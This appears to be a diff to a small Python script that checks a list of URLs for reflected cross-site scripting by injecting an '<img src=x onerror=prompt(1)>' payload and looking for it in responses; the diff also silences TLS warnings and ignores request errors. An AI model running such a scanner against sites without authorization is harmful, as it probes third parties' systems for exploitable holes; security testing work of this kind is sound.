@@ -1,9 +1,12 @@
 import argparse
 import requests
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 parser = argparse.ArgumentParser(description='Process some URLs.')
 parser.add_argument('--file', type=str, required=True, help='input file containing urls')
-parser.add_argument('--payload', type=str, default='<img src=x onerror=prompt(1)>', help='custom payload to use')
+parser.add_argument('--payload', type=str, default='<img src=x onerror=prompt(1)>', help='payload for XSS attack')
 
 args = parser.parse_args()
 
@@ -31,5 +34,7 @@ for url in urls:
 
         if args.payload in response.text:
             print(f'XSS vulnerability found in {url}')
+    except requests.exceptions.RequestException:
+        pass
     except Exception as e:
         print(f'Error occurred while processing {url}: {e}')
